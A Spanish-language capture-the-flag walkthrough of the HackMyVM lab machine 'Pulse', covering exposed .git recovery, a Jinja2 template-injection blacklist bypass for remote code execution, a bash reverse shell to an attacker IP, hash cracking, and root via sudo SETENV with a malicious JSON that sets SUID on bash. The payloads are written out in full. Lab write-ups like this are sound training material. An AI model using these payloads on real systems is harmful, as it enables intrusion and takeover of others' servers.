# 🖥️ Pulse - HackMyVM

> **Dificultad:** Intermediate  
> **OS:** Ubuntu 26.04.1 LTS  
> **IP:** 192.168.0.166  
> **Fecha:** 2026-09-29

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
nmap -Pn -p- --min-rate 5000 192.168.0.166
nmap -Pn -sV -sC -p 22,80 192.168.0.166
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 10.2p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.28.3 Ubuntu |

**Hallazgos clave del nmap:**
- `robots.txt` expone rutas `/dev/` e `/internal/`, con comentario apuntando a `monitor.pulse.hmv`
- Header `X-Notice` en la respuesta indica que se necesitan vhosts: `pulse.hmv` y `monitor.pulse.hmv`

Añadir a `/etc/hosts`:
```
192.168.0.166 pulse.hmv monitor.pulse.hmv
```

---

## 🌐 Enumeración Web

### /dev/ — DevOps Bulletin

Accesible directamente por IP (sin vhost). Contiene un boletín interno de `alex@pulse.hmv` con tres pistas críticas:

1. El portal de monitorización está en `monitor.pulse.hmv`
2. Aviso: nunca dejar `.git` expuesto en el webroot
3. El endpoint `/diagnostics` requiere un token extraído del repositorio

> ⚠️ **Lección aprendida:** Los boletines de DevOps son información OSINT de alto valor. El propio autor avisa del `.git` expuesto — hay que ir directo a buscarlo.

### monitor.pulse.hmv — .git expuesto

```bash
git-dumper http://monitor.pulse.hmv/.git /tmp/pulse-git
cd /tmp/pulse-git
git log --oneline
```

**Commits encontrados:**
```
483e1a3 security: enforce X-Pulse-Auth header authentication
65fdb69 feat: add notification template rendering sandbox
21c9346 feat: initial commit
```

```bash
git diff HEAD~1 HEAD
```

`app.py` extraído del historial revela:
```python
DIAGNOSTIC_TOKEN = "pU1s3_d14gn0st1cs_k3y_98234"
SECRET_KEY = "c798e1f02a45b891d2ef64098bc19a32"

# render_template_string(template) con input del usuario → SSTI
# Blacklist: ['os','popen','system','subprocess','eval','exec','commands','__import__']
```

---

## 💥 Explotación — SSTI Flask/Jinja2 → RCE (www-data)

### Verificar SSTI

```bash
curl -s -X POST http://monitor.pulse.hmv/diagnostics \
  -d "token=pU1s3_d14gn0st1cs_k3y_98234&template={{7*7}}"
# {"output":"49","status":"success"}
```

### Bypass de la blacklist

El filtro comprueba si la keyword está como **substring literal** en el template (`keyword in template.lower()`). Si concatenamos los strings en Jinja2, el filtro no detecta la cadena completa:

- `'o'+'s'` → no contiene la cadena `os`
- `'p'+'open'` → no contiene la cadena `popen`

> ⚠️ **Lección aprendida:** Un filtro de blacklist por substring es fácilmente bypasseable con concatenación de strings en tiempo de ejecución del template. La solución robusta es usar AST/allowlist, no keyword matching.

### Payload RCE

```bash
curl -s -X POST http://monitor.pulse.hmv/diagnostics \
  --data-urlencode "token=pU1s3_d14gn0st1cs_k3y_98234" \
  --data-urlencode "template={{ cycler.__init__.__globals__['o'+'s']|attr('p'+'open')('id')|attr('read')() }}"
# {"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","status":"success"}
```

### Reverse Shell

```bash
# Listener en Kali:
nc -lvnp 4444

# Payload:
curl -s -X POST http://monitor.pulse.hmv/diagnostics \
  --data-urlencode "token=pU1s3_d14gn0st1cs_k3y_98234" \
  --data-urlencode "template={{ cycler.__init__.__globals__['o'+'s']|attr('p'+'open')('bash -c \"bash -i >& /dev/tcp/192.168.0.35/4444 0>&1\"')|attr('read')() }}"

# Estabilizar la shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

---

## 🔺 Escalada: www-data → alex

Como `www-data` tenemos acceso a la base de datos SQLite de la aplicación:

```bash
sqlite3 /opt/pulse/data/users.db "SELECT * FROM users;"
# alex|alex@pulse.hmv|$6$pulse$A0zjfe.Tf.0/0cJ6usQ/5FQMcTJJ5uADzhShund6hYEke.QqiWn7U5vAYbjc2exfZXGmHrrJTukBURkCqrjOk1
```

Crackear el hash SHA-512 en Kali:

```bash
echo '$6$pulse$A0zjfe.Tf.0/0cJ6usQ/5FQMcTJJ5uADzhShund6hYEke.QqiWn7U5vAYbjc2exfZXGmHrrJTukBURkCqrjOk1' > /tmp/hash.txt
hashcat -m 1800 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
# Resultado: starlight
```

```bash
ssh alex@192.168.0.166  # password: starlight
cat ~/user.txt          # HMV{9b3f41c7e2a84d60b5e9f1a23c8e715d}
```

---

## 🔺 Escalada: alex → root

```bash
sudo -l
# (ALL : ALL) SETENV: NOPASSWD: /usr/local/bin/pulse-audit
```

`pulse-audit` es un script Python que lee un JSON de configuración desde la variable de entorno `PULSE_CONFIG` y ejecuta el campo `pre_audit_cmd` con `subprocess.run(shell=True)` como **root**.

La flag `SETENV` en sudo permite pasar variables de entorno arbitrarias al proceso root:

```bash
# 1. Crear JSON malicioso
python3 -c 'open("/tmp/evil.json","w").write(
  "{\"policy_name\":\"pwn\",\"pre_audit_cmd\":\"chmod u+s /bin/bash\",\"monitored_services\":[]}"
)'

# 2. Ejecutar pulse-audit con el JSON malicioso como root
sudo PULSE_CONFIG=/tmp/evil.json /usr/local/bin/pulse-audit

# 3. Shell como root
bash -p
id       # euid=0(root)
cat /root/root.txt  # HMV{4d2c88f7b301e5a96c147289d038fa42}
```

> ⚠️ **Lección aprendida:** `SETENV` en `sudo -l` es una señal de alarma. Permite inyectar variables de entorno al proceso privilegiado — si el binario usa rutas de config controlables por env var, es una escalada directa.

---

## 📋 Resumen

| Fase | Técnica |
|------|---------|
| Reconocimiento | nmap → robots.txt + header X-Notice → vhosts |
| Enumeración | git-dumper → código fuente + token + blacklist |
| Explotación | SSTI Jinja2 bypass blacklist → RCE www-data |
| www-data → alex | SQLite users.db → hashcat SHA-512 → starlight → SSH |
| alex → root | sudo SETENV NOPASSWD pulse-audit → JSON malicioso → SUID bash |

## 🔍 TTPs MITRE ATT&CK

| ID | Técnica |
|----|---------|
| T1083 | File and Directory Discovery (robots.txt, .git exposure) |
| T1552.001 | Credentials in Files (token en git history, SQLite) |
| T1190 | Exploit Public-Facing Application (SSTI Flask/Jinja2) |
| T1059.004 | Unix Shell (reverse shell bash) |
| T1078 | Valid Accounts (alex:starlight via SSH) |
| T1548.003 | Sudo and Sudo Caching (SETENV NOPASSWD abuse) |
